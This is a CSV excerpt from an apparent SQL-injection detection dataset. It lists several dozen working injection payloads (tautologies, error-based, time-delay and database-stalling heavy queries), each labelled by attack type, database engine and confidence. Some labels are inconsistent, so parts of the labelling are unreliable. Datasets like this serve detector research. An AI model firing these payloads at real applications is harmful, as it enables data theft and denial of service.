id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
18544,1'|| ( select 'etvo' from dual where 1557 = 1557,boolean_blind,oracle,0.95,injected WHERE-tautology 'where 1557 = 1557' is boolean true oracle ; db_engine=oracle,3
18545,"1' ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( 'wmrr' like 'wmrr",boolean_blind,generic,0.95,LIKE tautology ''wmrr' like 'wmrr' yields boolean true/false ; db_engine=generic,3
18546,"1%' ) ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ( '%' = '",boolean_blind,mysql,0.85,numeric tautology '7982 = 7982' acts as boolean true branch ; secondary signals: 'extractvalue (' (error_based) ; db_engine=mysql,2
18547,"1"" ) ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ""lazm"" like ""lazm",heavy_query,oracle,0.75,5 cartesian aliases of 'all_users' produce row explosion → heavy_query ; db_engine=oracle,1
18548,"1%' ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( '%' = '",boolean_blind,mysql,0.85,numeric tautology '3393 = 3393' acts as boolean true branch ; secondary signals: 'updatexml (' (error_based) ; db_engine=mysql,2
18549,"1 ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a )",boolean_blind,mysql,0.85,numeric tautology '9067 = 9067' acts as boolean true branch ; db_engine=mysql,2
18550,"1',row ( 7937,5067 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 7937 = 7937,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 9974 union select 5497 union select 8209 union select 8147 ) a group by x )",boolean_blind,mysql,0.85,numeric tautology '7937 = 7937' acts as boolean true branch ; secondary signals: 'union select' (union_based) ; db_engine=mysql,2
18551,-5152' ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( 'jumr' like 'jumr,boolean_blind,oracle,0.95,numeric tautology '4747 = 4747' acts as boolean true branch ; db_engine=oracle,3
18552,"1 ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( 5037 = 5037",boolean_blind,mysql,0.85,numeric tautology '8190 = 8190' acts as boolean true branch ; secondary signals: 'exp (' (error_based) ; db_engine=mysql,2
18553,"1 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) # dyed",boolean_blind,mysql,0.85,numeric tautology '3393 = 3393' acts as boolean true branch ; secondary signals: 'updatexml (' (error_based) ; db_engine=mysql,2
18554,"1' where 8277 = 8277 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) --",boolean_blind,mysql,0.85,injected WHERE-tautology 'where 8277 = 8277' is boolean true oracle ; secondary signals: 'updatexml (' (error_based) ; db_engine=mysql,2
18555,"1%"" ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ""%"" = """,boolean_blind,mysql,0.85,numeric tautology '1210 = 1210' acts as boolean true branch ; secondary signals: 'sleep (' (time_blind) ; db_engine=mysql,2
18556,"1%"" or elt ( 5873 = 5873,sleep ( 5 ) ) #",boolean_blind,mysql,0.85,numeric tautology '5873 = 5873' acts as boolean true branch ; secondary signals: 'sleep (' (time_blind) ; db_engine=mysql,2
18557,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and 'fbnx' = 'fbnx",benign,firebird,0.85,No SQLi tokens found in payload (no UNION/SLEEP/extractvalue/OR 1=1/--/;EXEC etc.); payload appears as benign SQL fragment 'select count ( * ) from rdb$fields as t1',1
18558,"1' ) ) as ngoo where 8641 = 8641 and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",boolean_blind,oracle,0.95,injected WHERE-tautology 'where 8641 = 8641' is boolean true oracle ; secondary signals: 'all_users' (heavy_query) ; db_engine=oracle,3
18559,"1 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) -- mtaq",heavy_query,oracle,0.75,5 cartesian aliases of 'all_users' produce row explosion → heavy_query ; db_engine=oracle,1
18560,"1"" ) as assu where 7521 = 7521 or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",boolean_blind,generic,0.95,injected WHERE-tautology 'where 7521 = 7521' is boolean true oracle ; db_engine=generic,3
18561,"1 and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",boolean_blind,generic,0.50,"UNCERTAIN: no rule-pattern match; both sources A and C agree on 'boolean_blind'. Payload fragment: '1 and 2716 = ( select count ( * ) from sysusers as sys1,sysu'",0
18562,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ""vabm"" = ""vabm",heavy_query,oracle,0.75,5 cartesian aliases of 'all_users' produce row explosion → heavy_query ; db_engine=oracle,1
18563,"1"" ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ""imlx"" = ""imlx",boolean_blind,mysql,0.85,numeric tautology '9067 = 9067' acts as boolean true branch ; db_engine=mysql,2
18564,1'|| ( select 'glec' from dual where 4846 = 4846,boolean_blind,oracle,0.95,injected WHERE-tautology 'where 4846 = 4846' is boolean true oracle ; db_engine=oracle,3
18565,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ""pxbk"" like ""pxbk",boolean_blind,generic,0.50,"UNCERTAIN: no rule-pattern match; both sources A and C agree on 'boolean_blind'. Payload fragment: 'select count ( * ) from domain.domains as t1,domain.columns '",0
18566,1'+ ( select 'rsgi' where 2258 = 2258,boolean_blind,generic,0.95,injected WHERE-tautology 'where 2258 = 2258' is boolean true oracle ; db_engine=generic,3
18567,"1'|| ( select 'xyft' from dual where 8250 = 8250 and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) ) ||'",boolean_blind,oracle,0.95,injected WHERE-tautology 'where 8250 = 8250' is boolean true oracle ; secondary signals: 'all_users' (heavy_query) ; db_engine=oracle,3
18568,1'+ ( select 'lpkv' where 8760 = 8760,boolean_blind,generic,0.95,injected WHERE-tautology 'where 8760 = 8760' is boolean true oracle ; db_engine=generic,3
18569,"1 ) ) ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ( 9255 = 9255",boolean_blind,generic,0.95,numeric tautology '9255 = 9255' acts as boolean true branch ; db_engine=generic,3
18570,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( '%' = '",heavy_query,oracle,0.75,5 cartesian aliases of 'all_users' produce row explosion → heavy_query ; db_engine=oracle,1
18571,"1' ) where 1323 = 1323 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) --",boolean_blind,mysql,0.85,injected WHERE-tautology 'where 1323 = 1323' is boolean true oracle ; secondary signals: 'extractvalue (' (error_based) ; db_engine=mysql,2
18572,"1%' ) and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",boolean_blind,db2,0.50,UNCERTAIN: no rule-pattern match; both sources A and C agree on 'boolean_blind'. Payload fragment: '1%' ) and 8189 = ( select count ( * ) from sysibm.systables ',0
18573,"1 and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) -- gynj",heavy_query,oracle,0.75,5 cartesian aliases of 'all_users' produce row explosion → heavy_query ; db_engine=oracle,1
18574,"1%"" ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ""%"" = """,boolean_blind,mysql,0.85,numeric tautology '9067 = 9067' acts as boolean true branch ; db_engine=mysql,2
18575,"1' ) ) as hfra where 6500 = 6500 and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",boolean_blind,oracle,0.95,injected WHERE-tautology 'where 6500 = 6500' is boolean true oracle ; secondary signals: 'all_users' (heavy_query) ; db_engine=oracle,3
18576,"1' where 5004 = 5004 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",boolean_blind,firebird,0.95,injected WHERE-tautology 'where 5004 = 5004' is boolean true oracle ; db_engine=firebird,3
18577,"1'|| ( select 'cqjw' from dual where 7335 = 7335 and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) ) ||'",boolean_blind,oracle,0.95,injected WHERE-tautology 'where 7335 = 7335' is boolean true oracle ; db_engine=oracle,3
18578,"1 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",error_based,mysql,0.85,error-induction call 'extractvalue (' leaks data through DB error message ; secondary signals: 'benchmark (' (time_blind) ; db_engine=mysql,2
18579,"1 or elt ( 6272 = 6272,sleep ( 5 ) ) -- ilfc",boolean_blind,mysql,0.85,numeric tautology '6272 = 6272' acts as boolean true branch ; secondary signals: 'sleep (' (time_blind) ; db_engine=mysql,2
18580,"end and ( ""nuix"" like ""nuix",boolean_blind,generic,0.50,"UNCERTAIN: no specific SQLi signal token matched in payload 'end and ( ""nuix"" like ""nuix'; cannot determine type confidently.",0
18581,1 ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,boolean_blind,mysql,0.95,'RLIKE' MySQL regex used for boolean inference ; secondary signals: 'sleep (' (time_blind) ; db_engine=mysql,3
18582,"1"" ) ) as ktue where 6392 = 6392 and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",boolean_blind,generic,0.95,injected WHERE-tautology 'where 6392 = 6392' is boolean true oracle ; db_engine=generic,3
18583,"1"" ) ) ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,oracle,0.75,5 cartesian aliases of 'all_users' produce row explosion → heavy_query ; db_engine=oracle,1
18584,"1 ) where 6990 = 6990 and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",boolean_blind,generic,0.95,injected WHERE-tautology 'where 6990 = 6990' is boolean true oracle ; db_engine=generic,3
18585,"1' in boolean mode ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) #",boolean_blind,mysql,0.85,numeric tautology '1045 = 1045' acts as boolean true branch ; secondary signals: 'union select' (union_based) ; db_engine=mysql,2
18586,"1 and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",boolean_blind,generic,0.50,"UNCERTAIN: no rule-pattern match; both sources A and C agree on 'boolean_blind'. Payload fragment: '1 and 3580 = ( select count ( * ) from domain.domains as t1,'",0
